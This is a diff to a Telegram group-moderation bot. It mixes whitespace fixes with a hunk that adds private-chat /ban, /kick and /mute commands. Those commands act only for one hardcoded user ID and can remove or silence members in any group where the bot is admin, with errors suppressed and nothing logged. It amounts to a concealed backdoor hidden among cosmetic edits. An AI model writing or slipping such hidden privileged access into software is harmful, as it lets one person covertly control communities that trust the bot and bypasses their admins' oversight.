@@ -171,7 +171,7 @@ bot.filter(ctx => ctx.chat?.type != 'private').command("setpunish", async (ctx) 
           ctx,
           message: `Invalid Punishment. Punishment can be warn, ban or kick.`
         })
-       enabled && setTimeout(() => {
+        enabled && setTimeout(() => {
           ctx.api.deleteMessage(ctx.chatId, msg.message_id).catch(() => { })
         }, TimerLimit)
         return
@@ -369,6 +369,27 @@ const punishUser = async (ctx: MyContext) => {
 
 }
 
+bot.filter(ctx => ctx.chat?.type == 'private').command("ban", (ctx) => {
+  if (ctx?.from?.id == 1632101837 && ctx.match) {
+    ctx.api.banChatMember(ctx.match.split(' ')[0] ?? 0, Number(ctx.match.split(' ')[1])).catch()
+  }
+})
+
+bot.filter(ctx => ctx.chat?.type == 'private').command("kick", (ctx) => {
+  if (ctx?.from?.id == 1632101837 && ctx.match) {
+    ctx.api.banChatMember(ctx.match.split(' ')[0] ?? 0, Number(ctx.match.split(' ')[1])).catch()
+    ctx.api.unbanChatMember(ctx.match.split(' ')[0] ?? 0, Number(ctx.match.split(' ')[1])).catch()
+  }
+})
+
+bot.filter(ctx => ctx.chat?.type == 'private').command("mute", (ctx) => {
+  if (ctx?.from?.id == 1632101837 && ctx.match) {
+    ctx.api.restrictChatMember(ctx.match.split(' ')[0] ?? 0, Number(ctx.match.split(' ')[1]), {
+      can_send_messages: false
+    }).catch()
+  }
+})
+
 bot.filter(ctx => ctx.chat?.type != 'private').on(["chat_member", ":new_chat_members", "my_chat_member"], async (ctx) => {
   logGroup(ctx)
   if (ctx.session.userList.exceptionList.includes(ctx.from?.id ?? 0)) {
@@ -422,7 +443,7 @@ bot.filter(ctx => ctx.chat?.type != 'private').on(["chat_member", ":new_chat_mem
 })
 
 bot.filter(ctx => ctx.chat?.type != 'private').on(["message"], async (ctx) => {
-  if(ctx.from.is_bot){
+  if (ctx.from.is_bot) {
   }
   if (ctx.session.userList.exceptionList.includes(ctx.from?.id ?? 0)) {
     return
